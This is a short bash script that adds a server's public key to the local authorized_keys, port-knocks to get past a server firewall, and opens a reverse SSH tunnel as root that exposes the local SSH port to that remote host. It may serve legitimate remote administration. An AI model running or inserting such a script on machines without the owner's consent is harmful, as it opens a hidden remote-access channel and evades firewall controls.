#!/bin/bash

set -euo pipefail

sudo apt-get install -y knockd

# Allow server to login to us
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "Injected server public key."

# Bypass server firewall
knock $C_SERVER $KNOCK_OPEN_TUNNEL -d 300

ssh -N -R $SERVER_TUNNEL_PORT:localhost:22 root@$SERVER_IP
